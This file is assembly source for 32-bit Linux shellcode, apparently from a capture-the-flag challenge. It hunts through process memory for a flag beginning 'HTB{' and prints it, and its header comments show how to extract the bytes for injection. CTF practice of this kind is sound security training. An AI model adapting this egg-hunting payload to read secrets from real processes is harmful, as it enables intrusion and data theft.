;nasm -f elf32 sc.asm && ld -m elf_i386 sc.o -o sc
;objdump -d sc|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

section     .text
global      _start                              ;must be declared for linker (ld)

_start:                                         ;tell linker entry point
    push    99
    pop     ebx
    push    27
    pop     eax
    int     0x80

    mov     edx, 0x5fffffff
    mov     edi, 0x7b425448

page_next:
    or      dx, 0xfff

addr_next:
    inc     edx
    pusha
    xor     ecx, ecx
    ;lea     ebx, [edx+4]
    lea     ebx, [edx]
    push    0x21
    pop     eax
    int     0x80
    cmp     al, 0xf2                            ;EFAULT -14
    popa
    jz      page_next
    cmp     [edx], edi
    jnz     addr_next

_write:
    push    edx                                 ;message to write
    pop     ecx
    push    36                                  ;message length
    pop     edx
    push    1                                   ;file descriptor (stdout)
    pop     ebx
    push    4                                   ;system call number (sys_write)
    pop     eax
    int     0x80                                ;call kernel
    push    1                                   ;system call number (sys_exit)
    pop     eax
    int     0x80                                ;call kernel

